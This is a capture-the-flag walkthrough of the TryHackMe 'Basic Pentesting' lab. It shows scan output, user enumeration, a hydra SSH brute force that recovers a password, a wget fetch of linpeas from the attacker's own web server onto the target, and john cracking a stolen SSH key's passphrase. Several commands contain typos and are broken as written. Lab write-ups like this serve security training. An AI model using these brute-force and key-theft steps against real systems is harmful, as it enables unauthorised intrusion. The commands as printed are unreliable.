#TryHackMe
#BasicPentesting

Let's scan the machine using nmap


	Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 01:45 EDT
	Nmap scan report for 10.10.203.74
	Host is up (0.19s latency).
	Not shown: 993 closed ports
	PORT     STATE    SERVICE     VERSION
	22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
	|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
	|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
	80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
	6005/tcp filtered X11:5
	8009/tcp open     ajp13       Apache Jserv (Protocol v1.3)
	| ajp-methods: 
	|_  Supported methods: GET HEAD POST OPTIONS
	8080/tcp open     http        Apache Tomcat 9.0.7
	|_http-favicon: Apache Tomcat
	|_http-title: Apache Tomcat/9.0.7
	Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
	|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| smb-os-discovery: 
	|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
	|   Computer name: basic2
	|   NetBIOS computer name: BASIC2\x00
	|   Domain name: \x00
	|   FQDN: basic2
	|_  System time: 2020-06-23T01:45:46-04:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2020-06-23T05:45:46
	|_  start_date: N/A

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 49.05 seconds

Several services, let's check the web server on browser. 

Let's see if we can use dirsearch/gobuster

	gobuster dir -u http://<ip>:80 -w /home/kali/tools/SecLists/Discovery/Web-Content/common.txt

Aha! Found a directory called /development/. There's just a couple of txt files with notes.

Let's use enum4linux to get users.

	 ======================================================================= 
	|    Users on 10.10.203.74 via RID cycling (RIDS: 500-550,1000-1050)    |
	 ======================================================================= 
	[I] Found new SID: S-1-22-1
	[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
	[I] Found new SID: S-1-5-32
	[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
	S-1-22-1-1000 Unix User\kay (Local User)
	S-1-22-1-1001 Unix User\jan (Local User)
	[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

Great. Two users on the system, kay and jan. We can use hydra to attempt bruteforcing our way into the machine through ssh.

	hydra -l jan -P /home/kali/tools/rockyou.txt ssh://<IP> 

	jan's password seems to be armando

Let's connect through ssh as jan.

	ssh jan@<IP>

Alright, I'm in, now what? 
It seems like we can access kay's files. LinPeas can be pretty useful here so let's try using it first, we have to transfer the script to our machine.
We setup a web server on our local machine.

	python -m http.server 80

Then, on the web server, let's make a request to our local machine for the linpeas script on a directory where we have write permissions.

	wget <localIP>/linpeas.sh

Let's make linpeas executable and run it:
	
	chmod +x linpeas.sh && ./linpeas

Linpeas reveals several files, but we find something very interesting. Kay has a hidden folder named .ssh , which contains a rsa private key file.
The next step is to attempt connecting to the server as kay. The first thing we should do is copy the contents of the rsa key to a local file and 
change it's permissions to 600, otherwise ssh won't let us use it. 

	chmod kay 600
	ssh -i kay kay@<IP> 

Uh oh. We need a pass phrase to connect as kay.

We can leverage the key file to get it using John the ripper, however, we need to convert the file to something john can read. 

	/opt/JohnTheRipper/run/ssh2john.py > kay4john

Once we've done this, let's try using john to get the passphrase. 

	sudo john --wordlist=/home/kali/tools/rockyou.txt akay4john

Great! the password is beeswax. Now we can connect as kay to the server

	ssh -i kay kay@<IP> 

Cool. Now we just cat the pass.bak file and get the flag.	







